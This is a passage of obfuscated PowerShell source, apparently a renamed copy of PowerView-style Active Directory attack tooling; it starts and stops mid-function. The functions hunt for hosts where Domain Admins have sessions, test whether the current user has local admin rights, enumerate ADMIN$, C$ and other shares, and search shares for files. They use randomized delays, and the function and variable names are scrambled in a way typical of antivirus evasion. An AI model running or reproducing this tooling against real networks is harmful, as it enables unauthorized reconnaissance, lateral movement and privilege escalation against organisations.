        "[*] Total number of hosts: $sczGJifQ99`r`n"
        foreach ($LxIyYIwe99 in $Hosts){
            
            $BzMQEsAu99 = $BzMQEsAu99 + 1
            if ($LxIyYIwe99 -ne ''){
                Write-Verbose "[*] Enumerating server $LxIyYIwe99 ($BzMQEsAu99 of $($Hosts.count))"
                While ($($pool.GetAvailableRunspaces()) -le 0) {
                    Start-Sleep -milliseconds 500
                }
        
                $ps += [powershell]::create()
       
                $ps[$BzMQEsAu99].runspacepool = $pool
                [void]$ps[$BzMQEsAu99].AddScript($iATbdRnY99).AddParameter('Server', $LxIyYIwe99).AddParameter('Ping', -not $UfipYUon99).AddParameter('TargetUsers', $UudCbJdN99).AddParameter('CurrentUser', $iyhvNPNI99).AddParameter('CurrentUserBase', $tyhSgetj99)
        
                $jobs += $ps[$BzMQEsAu99].BeginInvoke();
         
                $wait += $jobs[$BzMQEsAu99].AsyncWaitHandle
            }
        }
    }
    end {
        Write-Verbose "Waiting for scanning threads to finish..."
        $VKYYmkzK99 = Get-Date
        while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $VKYYmkzK99).totalSeconds) -gt 60) {
                Start-Sleep -milliseconds 500
            } 
        for ($y = 0; $y -lt $BzMQEsAu99; $y++) {     
            try {   
                $ps[$y].EndInvoke($jobs[$y])   
            } catch {
                Write-Warning "error: $_"  
            }
            finally {
                $ps[$y].Dispose()
            }    
        }
        $pool.Dispose()
    }
}
function heard {
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,
        [string]
        $nMIWdEkf99,
        [string]
        $YrweeofD99 = 'Domain Admins',
        [string]
        $OU,
        [string]
        $MBVLzigF99,
        [string]
        $EOQyLHjF99,
        [Switch]
        $SPN,
        [Switch]
        $oErmiNrs99,
        [Switch]
        $UfipYUon99,
        [UInt32]
        $Delay = 0,
        [double]
        $OTbZbzgr99 = .3,
        [string]
        $wdyyUevv99,
        [string]
        $dOCGgZVW99
    )
    
    begin {
        if ($PSBoundParameters['Debug']) {
            $vPuRmPba99 = 'Continue'
        }
        
        $UudCbJdN99 = @()
        
        $VjBSuPpJ99 = @()
        
        $wmnsBtCQ99 = New-Object System.Random
        
        $iyhvNPNI99 = overshare
        $tyhSgetj99 = ([Environment]::UserName)
        
        if($dOCGgZVW99){
            $rYtPqZdr99 = $dOCGgZVW99
        }
        else{
            $rYtPqZdr99 = $null
        }
        
        "[*] Running heard with delay of $Delay"
        if($rYtPqZdr99){
            "[*] Domain: $rYtPqZdr99"
        }
        if ($EOQyLHjF99){
            "`r`n[*] Using target user '$EOQyLHjF99'..."
            $UudCbJdN99 += $EOQyLHjF99.ToLower()
        }
        elseif($OU){
            $UudCbJdN99 = bounciest -OU $OU | ForEach-Object {$_.samaccountname}
        }
        elseif($MBVLzigF99){
            $UudCbJdN99 = bounciest -MBVLzigF99 $MBVLzigF99 | ForEach-Object {$_.samaccountname}
        }
        elseif($wdyyUevv99){
            $UudCbJdN99 = @()
            if (Test-Path -Path $wdyyUevv99){
                $UudCbJdN99 = Get-Content -Path $wdyyUevv99 
            }
            else {
                Write-Warning "`r`n[!] Input file '$wdyyUevv99' doesn't exist!`r`n"
                "`r`n[!] Input file '$wdyyUevv99' doesn't exist!`r`n"
                return
            }
        }
        else{
            "`r`n[*] Querying domain group '$YrweeofD99' for target users..."
            $temp = compelling -YrweeofD99 $YrweeofD99 -dOCGgZVW99 $rYtPqZdr99
            $UudCbJdN99 = $temp | ForEach-Object {$_.ToLower() }
        }
        
        if (($UudCbJdN99 -eq $null) -or ($UudCbJdN99.Count -eq 0)){
            Write-Warning "`r`n[!] No users found to search for!"
            "`r`n[!] No users found to search for!"
            return
        }
        if($nMIWdEkf99){
            if (Test-Path -Path $nMIWdEkf99){
                $Hosts = Get-Content -Path $nMIWdEkf99
            }
            else{
                Write-Warning "[!] Input file '$nMIWdEkf99' doesn't exist!"
                "[!] Input file '$nMIWdEkf99' doesn't exist!"
                return
            }
        }
        elseif($HGrbOFdX99){
            Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts with filter '$HGrbOFdX99'`r`n"
            $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99 -uVOoDBse99 $HGrbOFdX99
        }
        elseif($SPN){
            $Hosts = combinations | Foreach-Object {
                $_.ServicePrincipalName | Foreach-Object {
                    ($_.split("/")[1]).split(":")[0]
                }
            } | Sort-Object | Get-Unique 
        }
    }
    process {
        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts...`r`n"
            [Array]$Hosts  = Teller -dOCGgZVW99 $rYtPqZdr99
        }
        
        $Hosts = supernovae $Hosts
        $sczGJifQ99 = $Hosts.Count
        "[*] Total number of hosts: $sczGJifQ99`r`n"
        $BzMQEsAu99 = 0
        
        foreach ($LxIyYIwe99 in $Hosts){
            
            $BzMQEsAu99 = $BzMQEsAu99 + 1
            
            Write-Verbose "[*] Enumerating host $LxIyYIwe99 ($BzMQEsAu99 of $($Hosts.count))"
            Start-Sleep -Seconds $wmnsBtCQ99.Next((1-$OTbZbzgr99)*$Delay, (1+$OTbZbzgr99)*$Delay)
            
            $up = $true
            if(-not $UfipYUon99){
                $up = disorganize -LxIyYIwe99 $LxIyYIwe99
            }
            if ($up){
                $GvlpoKNj99 = swagged $LxIyYIwe99
                
                foreach ($ddqEcwGf99 in $GvlpoKNj99) {
                    Write-Debug "[*] Session: $ddqEcwGf99"
                    $EOQyLHjF99 = $ddqEcwGf99.sesi10_username
                    $cname = $ddqEcwGf99.sesi10_cname
                    $vhYWUsCi99 = $ddqEcwGf99.sesi10_time
                    $FmOpRXrU99 = $ddqEcwGf99.sesi10_idle_time
                    
                    if (($EOQyLHjF99 -ne $null) -and ($EOQyLHjF99.trim() -ne '') -and ($EOQyLHjF99.trim().toLower() -ne $tyhSgetj99)){
                        if ($UudCbJdN99 -contains $EOQyLHjF99){
                            $ip = deltas -uVOoDBse99 $LxIyYIwe99
                            "[+] Target user '$EOQyLHjF99' has a session on $LxIyYIwe99 ($ip) from $cname"
                            
                            if ($oErmiNrs99){
                                Start-Sleep -Seconds $wmnsBtCQ99.Next((1-$OTbZbzgr99)*$Delay, (1+$OTbZbzgr99)*$Delay)
                                if (Dave -Hostname $LxIyYIwe99){
                                    "[+] Current user '$iyhvNPNI99' has local admin access on $LxIyYIwe99 !"
                                }
                                if (Dave -Hostname $cname){
                                    "[+] Current user '$iyhvNPNI99' has local admin access on $cname !"
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
function dehydrate {
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,
        [string]
        $nMIWdEkf99,
        [string]
        $HGrbOFdX99,
        [string]
        $YrweeofD99 = 'Domain Admins',
        [string]
        $OU,
        [string]
        $MBVLzigF99,
        [string]
        $EOQyLHjF99,
        [string]
        $OsBLAPVE99,
        [string]
        $yHhugoYv99,
        [Switch]
        $UfipYUon99,
        [UInt32]
        $Delay = 0,
        [double]
        $OTbZbzgr99 = .3,
        [string]
        $wdyyUevv99,
        [string]
        $dOCGgZVW99
    )
    
    begin {
        if ($PSBoundParameters['Debug']) {
            $vPuRmPba99 = 'Continue'
        }
        
        $UudCbJdN99 = @()
        
        $wmnsBtCQ99 = New-Object System.Random
        
        $iyhvNPNI99 = overshare
        $tyhSgetj99 = ([Environment]::UserName).toLower()
        
        if($dOCGgZVW99){
            $rYtPqZdr99 = $dOCGgZVW99
        }
        else{
            $rYtPqZdr99 = $null
        }
        
        Write-Verbose "[*] Running dehydrate with a delay of $delay"
        if($rYtPqZdr99){
            Write-Verbose "[*] Domain: $rYtPqZdr99"
        }
        if($nMIWdEkf99){
            if (Test-Path -Path $nMIWdEkf99){
                $Hosts = Get-Content -Path $nMIWdEkf99
            }
            else{
                Write-Warning "[!] Input file '$nMIWdEkf99' doesn't exist!"
                return
            }
        }
        elseif($HGrbOFdX99){
            Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts with filter '$HGrbOFdX99'`r`n"
            $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99 -uVOoDBse99 $HGrbOFdX99
        }
        if ($EOQyLHjF99){
            $UudCbJdN99 += $EOQyLHjF99.ToLower()
        }
        elseif($OU){
            $UudCbJdN99 = bounciest -OU $OU | ForEach-Object {$_.samaccountname}
        }
        elseif($MBVLzigF99){
            $UudCbJdN99 = bounciest -MBVLzigF99 $MBVLzigF99 | ForEach-Object {$_.samaccountname}
        }
        elseif($wdyyUevv99){
            $UudCbJdN99 = @()
            if (Test-Path -Path $wdyyUevv99){
                $UudCbJdN99 = Get-Content -Path $wdyyUevv99 
            }
            else {
                Write-Warning "`r`n[!] Input file '$wdyyUevv99' doesn't exist!`r`n"
                return
            }
        }
        else{
            $temp = compelling -YrweeofD99 $YrweeofD99 -dOCGgZVW99 $rYtPqZdr99
            $UudCbJdN99 = $temp | ForEach-Object {$_.ToLower() }
        }
        $UudCbJdN99 = $UudCbJdN99 | ForEach-Object {$_.ToLower()}
        if (($UudCbJdN99 -eq $null) -or ($UudCbJdN99.Count -eq 0)){
            Write-Warning "`r`n[!] No users found to search for!"
            return
        }
    }
    
    process {
        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts...`r`n"
            $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99
        }
        
        $Hosts = supernovae $Hosts
        $sczGJifQ99 = $Hosts.Count
        $BzMQEsAu99 = 0
        foreach ($LxIyYIwe99 in $Hosts){
            $BzMQEsAu99 = $BzMQEsAu99 + 1
            if ($LxIyYIwe99 -ne ''){
                Start-Sleep -Seconds $wmnsBtCQ99.Next((1-$OTbZbzgr99)*$Delay, (1+$OTbZbzgr99)*$Delay)
                
                Write-Verbose "[*] Enumerating target $LxIyYIwe99 ($BzMQEsAu99 of $($Hosts.count))"
                
                $up = $true
                if(-not $UfipYUon99){
                    $up = disorganize -LxIyYIwe99 $LxIyYIwe99
                }
                if ($up){
                    $zTlxTHug99 = hosteling -OsBLAPVE99 $OsBLAPVE99 -yHhugoYv99 $yHhugoYv99 -uVOoDBse99 $LxIyYIwe99 -ErrorAction SilentlyContinue
                    foreach ($FpVulKuq99 in $zTlxTHug99) {
                        if ($UudCbJdN99 -contains $FpVulKuq99.User){
                            $FpVulKuq99
                        }
                    }
                }
            }
        }
    }
}
function Mantle {
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,
        [string]
        $umPrjzQg99 = "putty",
        [string]
        $nMIWdEkf99,
        [string]
        $HGrbOFdX99,
        [string]
        $OsBLAPVE99,
        [string]
        $yHhugoYv99,
        [Switch]
        $UfipYUon99,
        [UInt32]
        $Delay = 0,
        [double]
        $OTbZbzgr99 = .3,
        [string]
        $dOCGgZVW99
    )
    
    begin {
        if ($PSBoundParameters['Debug']) {
            $vPuRmPba99 = 'Continue'
        }
        
        $wmnsBtCQ99 = New-Object System.Random
        
        if($dOCGgZVW99){
            $rYtPqZdr99 = $dOCGgZVW99
        }
        else{
            $rYtPqZdr99 = $null
        }
        
        Write-Verbose "[*] Running Mantle with a delay of $delay"
        if($rYtPqZdr99){
            Write-Verbose "[*] Domain: $rYtPqZdr99"
        }
        if($nMIWdEkf99){
            if (Test-Path -Path $nMIWdEkf99){
                $Hosts = Get-Content -Path $nMIWdEkf99
            }
            else{
                Write-Warning "[!] Input file '$nMIWdEkf99' doesn't exist!"
                return
            }
        }
        elseif($HGrbOFdX99){
            Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts with filter '$HGrbOFdX99'`r`n"
            $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99 -uVOoDBse99 $HGrbOFdX99
        }
    }
    
    process {
        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts...`r`n"
            $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99
        }
        
        $Hosts = supernovae $Hosts
        $sczGJifQ99 = $Hosts.Count
        $BzMQEsAu99 = 0
        foreach ($LxIyYIwe99 in $Hosts){
            $BzMQEsAu99 = $BzMQEsAu99 + 1
            if ($LxIyYIwe99 -ne ''){
                Start-Sleep -Seconds $wmnsBtCQ99.Next((1-$OTbZbzgr99)*$Delay, (1+$OTbZbzgr99)*$Delay)
                
                Write-Verbose "[*] Enumerating target $LxIyYIwe99 ($BzMQEsAu99 of $($Hosts.count))"
                
                $up = $true
                if(-not $UfipYUon99){
                    $up = disorganize -LxIyYIwe99 $LxIyYIwe99
                }
                if ($up){
                    $zTlxTHug99 = hosteling -OsBLAPVE99 $OsBLAPVE99 -yHhugoYv99 $yHhugoYv99 -uVOoDBse99 $LxIyYIwe99 -ErrorAction SilentlyContinue
                    foreach ($FpVulKuq99 in $zTlxTHug99) {
                        if ($FpVulKuq99.Process -match $umPrjzQg99){
                            $FpVulKuq99
                        }
                    }
                }
            }
        }
    }
}
function Cliburn {
    
    [CmdletBinding()]
    param(
        [string]
        $YrweeofD99 = 'Domain Admins',
        [string]
        $OU,
        [string]
        $MBVLzigF99,
        [string]
        $EOQyLHjF99,
        [string]
        $wdyyUevv99,
        [string]
        $dOCGgZVW99,
        [int32]
        $nJKhKAoN99 = 3
    )
    
    if ($PSBoundParameters['Debug']) {
        $vPuRmPba99 = 'Continue'
    }
    
    $UudCbJdN99 = @()
    
    if ($EOQyLHjF99){
        $UudCbJdN99 += $EOQyLHjF99.ToLower()
    }
    elseif($OU -or $MBVLzigF99){
        $UudCbJdN99 = bounciest -MBVLzigF99 $MBVLzigF99 -OU $OU -dOCGgZVW99 $dOCGgZVW99 | ForEach-Object {$_.samaccountname}
    }
    elseif($wdyyUevv99){
        $UudCbJdN99 = @()
        if (Test-Path -Path $wdyyUevv99){
            $UudCbJdN99 = Get-Content -Path $wdyyUevv99 
        }
        else {
            Write-Warning "[!] Input file '$wdyyUevv99' doesn't exist!`r`n"
            return
        }
    }
    else{
        $temp = compelling -YrweeofD99 $YrweeofD99 -dOCGgZVW99 $dOCGgZVW99
        $UudCbJdN99 = $temp | ForEach-Object {$_.ToLower() }
    }
    $UudCbJdN99 = $UudCbJdN99 | ForEach-Object {$_.ToLower()}
    if (($UudCbJdN99 -eq $null) -or ($UudCbJdN99.Count -eq 0)){
        Write-Warning "[!] No users found to search for!"
        return
    }
    $EhqNlbqS99 = popularly -dOCGgZVW99 $dOCGgZVW99 | % {$_.Name}
    foreach ($DC in $EhqNlbqS99){
        Write-Verbose "[*] Querying domain controller $DC for event logs"
        paradox -uVOoDBse99 $DC -OkONtoJO99 ([DateTime]::Today.AddDays(-$nJKhKAoN99)) | Where-Object {
            $UudCbJdN99 -contains $_.UserName
        }
                
        Pickett -uVOoDBse99 $DC -OkONtoJO99 ([DateTime]::Today.AddDays(-$nJKhKAoN99)) | Where-Object {
            $UudCbJdN99 -contains $_.UserName
        }
    }
}
function despair {
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,
        [string]
        $nMIWdEkf99,
        [string]
        $HGrbOFdX99,
        [Switch]
        $otxYSCZr99,
        [Switch]
        $ZpHwLpYo99,
        [Switch]
        $ZlwPNJmS99,
        [Switch]
        $UfipYUon99,
        [Switch]
        $pyDUmTaM99,
        [Switch]
        $fpyeCdLF99,
        [UInt32]
        $Delay = 0,
        [double]
        $OTbZbzgr99 = .3,
        [String]
        $dOCGgZVW99
    )
    
    begin {
        If ($PSBoundParameters['Debug']) {
            $vPuRmPba99 = 'Continue'
        }
        
        [String[]] $lxaLbpar99 = @('')
        
        if ($ZpHwLpYo99){
            $lxaLbpar99 = $lxaLbpar99 + "PRINT$"
        }
        if ($ZlwPNJmS99){
            $lxaLbpar99 = $lxaLbpar99 + "IPC$"
        }
        if ($otxYSCZr99){
            $lxaLbpar99 = @('', "ADMIN$", "IPC$", "C$", "PRINT$")
        }
        
        $wmnsBtCQ99 = New-Object System.Random
        
        $iyhvNPNI99 = overshare
        
        if($dOCGgZVW99){
            $rYtPqZdr99 = $dOCGgZVW99
        }
        else{
            $rYtPqZdr99 = $null
        }
        
        Write-Verbose "[*] Running despair with delay of $Delay"
        if($rYtPqZdr99){
            Write-Version "[*] Domain: $rYtPqZdr99"
        }
        if($nMIWdEkf99){
            if (Test-Path -Path $nMIWdEkf99){
                $Hosts = Get-Content -Path $nMIWdEkf99
            }
            else {
                Write-Warning "`r`n[!] Input file '$nMIWdEkf99' doesn't exist!`r`n"
                return $null
            }
        }
        else{
            if($HGrbOFdX99){
                Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts with filter '$HGrbOFdX99'`r`n"
                $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99 -uVOoDBse99 $HGrbOFdX99
            }
            else {
                Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts...`r`n"
                $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99
            }
        }
    }
    process{
        
        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts...`r`n"
            $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99
        }
        
        $Hosts = supernovae $Hosts
        $BzMQEsAu99 = 0
        
        foreach ($LxIyYIwe99 in $Hosts){
            
            $BzMQEsAu99 = $BzMQEsAu99 + 1
            
            Write-Verbose "[*] Enumerating server $LxIyYIwe99 ($BzMQEsAu99 of $($Hosts.count))"
            
            if ($LxIyYIwe99 -ne ''){
                Start-Sleep -Seconds $wmnsBtCQ99.Next((1-$OTbZbzgr99)*$Delay, (1+$OTbZbzgr99)*$Delay)
                
                $up = $true
                if(-not $UfipYUon99){
                    $up = disorganize -LxIyYIwe99 $LxIyYIwe99
                }
                if($up){
                    $bphkWboz99 = Carly -uVOoDBse99 $LxIyYIwe99
                    foreach ($share in $bphkWboz99) {
                        Write-Debug "[*] Server share: $share"
                        $sGWzjfsu99 = $share.shi1_netname
                        $ITkhsIQD99 = $share.shi1_remark
                        $path = '\\'+$LxIyYIwe99+'\'+$sGWzjfsu99
                        if (($sGWzjfsu99) -and ($sGWzjfsu99.trim() -ne '')){
                            
                            if($fpyeCdLF99){
                                if($sGWzjfsu99.ToUpper() -eq "ADMIN$"){
                                    try{
                                        $f=[IO.Directory]::GetFiles($path)
                                        "\\$LxIyYIwe99\$sGWzjfsu99 `t- $ITkhsIQD99"
                                    }
                                    catch {}
                                }
                            }
                            
                            elseif ($lxaLbpar99 -notcontains $sGWzjfsu99.ToUpper()){
                                if($pyDUmTaM99){
                                    try{
                                        $f=[IO.Directory]::GetFiles($path)
                                        "\\$LxIyYIwe99\$sGWzjfsu99 `t- $ITkhsIQD99"
                                    }
                                    catch {}
                                }
                                else{
                                    "\\$LxIyYIwe99\$sGWzjfsu99 `t- $ITkhsIQD99"
                                }
                            } 
                        }           
                    }
                }
            }
        }
    }
}
function carrousels {
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,
        [string]
        $nMIWdEkf99,
        [string]
        $HGrbOFdX99,
        [string[]]
        $lxaLbpar99,
        [Switch] 
        $pyDUmTaM99,
        [Switch] 
        $UfipYUon99,
        [string]
        $dOCGgZVW99,
        [Int]
        $sPSLbcro99 = 10
    )
    
    begin {
        If ($PSBoundParameters['Debug']) {
            $vPuRmPba99 = 'Continue'
        }
        
        if($dOCGgZVW99){
            $rYtPqZdr99 = $dOCGgZVW99
        }
        else{
            $rYtPqZdr99 = $null
        }
        
        $iyhvNPNI99 = ([Environment]::UserName).toLower()
        
        Write-Verbose "[*] Running carrousels with delay of $Delay"
        if($rYtPqZdr99){
            Write-Verbose "[*] Domain: $rYtPqZdr99"
        }
        if($nMIWdEkf99){
            if (Test-Path -Path $nMIWdEkf99){
                $Hosts = Get-Content -Path $nMIWdEkf99
            }
            else{
                Write-Warning "[!] Input file '$nMIWdEkf99' doesn't exist!"
                "[!] Input file '$nMIWdEkf99' doesn't exist!"
                return
            }
        }
        elseif($HGrbOFdX99){
            Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts with filter '$HGrbOFdX99'`r`n"
            $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99 -uVOoDBse99 $HGrbOFdX99
        }
        
        $iATbdRnY99 = {
            param($LxIyYIwe99, $Ping, $pyDUmTaM99, $lxaLbpar99, $fpyeCdLF99)
            $up = $true
            if($Ping){
                $up = disorganize -LxIyYIwe99 $LxIyYIwe99
            }
            if($up){
                $bphkWboz99 = Carly -uVOoDBse99 $LxIyYIwe99
                foreach ($share in $bphkWboz99) {
                    Write-Debug "[*] Server share: $share"
                    $sGWzjfsu99 = $share.shi1_netname
                    $ITkhsIQD99 = $share.shi1_remark
                    $path = '\\'+$LxIyYIwe99+'\'+$sGWzjfsu99
                    if (($sGWzjfsu99) -and ($sGWzjfsu99.trim() -ne '')){
                        if($fpyeCdLF99){
                            if($sGWzjfsu99.ToUpper() -eq "ADMIN$"){
                                try{
                                    $f=[IO.Directory]::GetFiles($path)
                                    "\\$LxIyYIwe99\$sGWzjfsu99 `t- $ITkhsIQD99"
                                }
                                catch {}
                            }
                        }
                        elseif ($lxaLbpar99 -notcontains $sGWzjfsu99.ToUpper()){
                            if($pyDUmTaM99){
                                try{
                                    $f=[IO.Directory]::GetFiles($path)
                                    "\\$LxIyYIwe99\$sGWzjfsu99 `t- $ITkhsIQD99"
                                }
                                catch {}
                            }
                            else{
                                "\\$LxIyYIwe99\$sGWzjfsu99 `t- $ITkhsIQD99"
                            }
                        } 
                    }
                }
            }
        }
        $ZQLNnLLm99 = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $ZQLNnLLm99.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
     
        $SMmnrEFb99 = Get-Variable -Scope 1
     
        $dUtpewzr99 = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")
     
        ForEach($Var in $SMmnrEFb99) {
            If($dUtpewzr99 -notcontains $Var.Name) {
            $ZQLNnLLm99.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
            }
        }
        ForEach($ayushNav99 in (Get-ChildItem Function:)) {
            $ZQLNnLLm99.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $ayushNav99.Name, $ayushNav99.Definition))
        }
     
        $BzMQEsAu99 = 0
        $pool = [runspacefactory]::CreateRunspacePool(1, $sPSLbcro99, $ZQLNnLLm99, $host)
        $pool.Open()
        $jobs = @()   
        $ps = @()   
        $wait = @()
        $BzMQEsAu99 = 0
    }
    process {
        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts...`r`n"
            $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99
        }
        
        $Hosts = supernovae $Hosts
        $sczGJifQ99 = $Hosts.Count
        Write-Verbose "[*] Total number of hosts: $sczGJifQ99"
        foreach ($LxIyYIwe99 in $Hosts){
            
            $BzMQEsAu99 = $BzMQEsAu99 + 1
            if ($LxIyYIwe99 -ne ''){
                Write-Verbose "[*] Enumerating server $LxIyYIwe99 $($BzMQEsAu99) of $($Hosts.count))"
                While ($($pool.GetAvailableRunspaces()) -le 0) {
                    Start-Sleep -milliseconds 500
                }
        
                $ps += [powershell]::create()
       
                $ps[$BzMQEsAu99].runspacepool = $pool
                [void]$ps[$BzMQEsAu99].AddScript($iATbdRnY99).AddParameter('Server', $LxIyYIwe99).AddParameter('Ping', -not $UfipYUon99).AddParameter('CheckShareAccess', $pyDUmTaM99).AddParameter('ExcludedShares', $lxaLbpar99)
        
                $jobs += $ps[$BzMQEsAu99].BeginInvoke();
         
                $wait += $jobs[$BzMQEsAu99].AsyncWaitHandle
            }
        }
    }
    end {
        Write-Verbose "Waiting for scanning threads to finish..."
        $VKYYmkzK99 = Get-Date
        while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $VKYYmkzK99).totalSeconds) -gt 60) {
                Start-Sleep -milliseconds 500
            } 
        for ($y = 0; $y -lt $BzMQEsAu99; $y++) {     
            try {   
                $ps[$y].EndInvoke($jobs[$y])   
            } catch {
                Write-Warning "error: $_"  
            }
            finally {
                $ps[$y].Dispose()
            }    
        }
        $pool.Dispose()
    }
}
function nagging {
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,
        [string]
        $nMIWdEkf99,
        [string]
        $HGrbOFdX99,
        [string]
        $DpZrNWOF99,
        
        [Switch]
        $UcUfahUc99,
        [Switch]
        $YrBDvecf99,
        
        [string[]]
        $Terms,
        
        [string]
        $rlhLsJBJ99 = '1/1/1970',
        
        [string]
        $beHpfBFb99 = '1/1/1970',
        
        [string]
        $TnvLvEKe99 = '1/1/1970',
        
        [Switch] 
        $edFFSqoq99,
        
        [Switch] 
        $YDtvujQH99,
        
        [Switch] 
        $qWuauHEy99,
        
        [Switch] 
        $oyatszxc99,
        
        [Switch] 
        $qlDFbOCS99,
        
        [string] 
        $JeGOQmAv99,
        
        [Switch]
        $UfipYUon99,
        
        [UInt32]
        $Delay = 0,
        [double]
        $OTbZbzgr99 = .3,
        [string]
        $dOCGgZVW99
    )
    begin {
    
        If ($PSBoundParameters['Debug']) {
            $vPuRmPba99 = 'Continue'
        }
        
        [String[]] $lxaLbpar99 = @("C$", "ADMIN$")
       
        $wmnsBtCQ99 = New-Object System.Random
        if ($edFFSqoq99){
            if ($YDtvujQH99){
                $lxaLbpar99 = @()
            }
            else{
                $lxaLbpar99 = @("ADMIN$")
            }
        }
        if ($YDtvujQH99){
            if ($edFFSqoq99){
                $lxaLbpar99 = @()
            }
            else{
                $lxaLbpar99 = @("C$")
            }
        }
        
        If ($JeGOQmAv99 -and (Test-Path -Path $JeGOQmAv99)){ Remove-Item -Path $JeGOQmAv99 }
        
        if($DpZrNWOF99){
            if (Test-Path -Path $DpZrNWOF99){
                foreach ($Item in Get-Content -Path $DpZrNWOF99) {
                    if (($Item -ne $null) -and ($Item.trim() -ne '')){
                        
                        $share = $Item.Split("`t")[0]
                        
                        $xjwfkvyW99 = $share.split('\')[3]
                        
                        $cmd = "locket -Path $share $(if($Terms){`"-Terms $($Terms -join ',')`"}) $(if($qWuauHEy99){`"-ExcludeFolders`"}) $(if($oyatszxc99){`"-ExcludeHidden`"}) $(if($YrBDvecf99){`"-FreshEXES`"}) $(if($UcUfahUc99){`"-OfficeDocs`"}) $(if($qlDFbOCS99){`"-CheckWriteAccess`"}) $(if($JeGOQmAv99){`"-OutFile $JeGOQmAv99`"})"
                        
                        Write-Verbose "[*] Enumerating share $share"
                        Invoke-Expression $cmd    
                    }
                }
            }
            else {
                Write-Warning "`r`n[!] Input file '$DpZrNWOF99' doesn't exist!`r`n"
                return $null
            }
            return
        }
        else{
            if($dOCGgZVW99){
                $rYtPqZdr99 = $dOCGgZVW99
            }
            else{
                $rYtPqZdr99 = $null
            }
            
            Write-Verbose "[*] Running nagging with delay of $Delay"
            if($rYtPqZdr99){
                Write-Verbose "[*] Domain: $rYtPqZdr99"
            }
            if($nMIWdEkf99){
                if (Test-Path -Path $nMIWdEkf99){
                    $Hosts = Get-Content -Path $nMIWdEkf99
                }
                else{
                    Write-Warning "[!] Input file '$nMIWdEkf99' doesn't exist!"
                    "[!] Input file '$nMIWdEkf99' doesn't exist!"
                    return
                }
            }
            elseif($HGrbOFdX99){
                Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts with filter '$HGrbOFdX99'`r`n"
                $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99 -uVOoDBse99 $HGrbOFdX99
            }
        }
    }
    process {
    
        if ( ((-not ($Hosts)) -or ($Hosts.length -eq 0)) -and (-not $DpZrNWOF99) ) {
            Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts...`r`n"
            $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99
        }
        $Hosts = supernovae $Hosts
        $BzMQEsAu99 = 0
        
        foreach ($LxIyYIwe99 in $Hosts){
            
            $BzMQEsAu99 = $BzMQEsAu99 + 1
            
            Write-Verbose "[*] Enumerating server $LxIyYIwe99 ($BzMQEsAu99 of $($Hosts.count))"
            
            if ($LxIyYIwe99 -and ($LxIyYIwe99 -ne '')){
                Start-Sleep -Seconds $wmnsBtCQ99.Next((1-$OTbZbzgr99)*$Delay, (1+$OTbZbzgr99)*$Delay)
                
                $up = $true
                if(-not $UfipYUon99){
                    $up = disorganize -LxIyYIwe99 $LxIyYIwe99
                }
                if($up){
                    $bphkWboz99 = Carly -uVOoDBse99 $LxIyYIwe99
                    foreach ($share in $bphkWboz99) {
                        Write-Debug "[*] Server share: $share"
                        $sGWzjfsu99 = $share.shi1_netname
                        $ITkhsIQD99 = $share.shi1_remark
                        $path = '\\'+$LxIyYIwe99+'\'+$sGWzjfsu99
                        
                        if (($sGWzjfsu99) -and ($sGWzjfsu99.trim() -ne '')){
                            
                            if ($lxaLbpar99 -notcontains $sGWzjfsu99.ToUpper()){
                                
                                try{
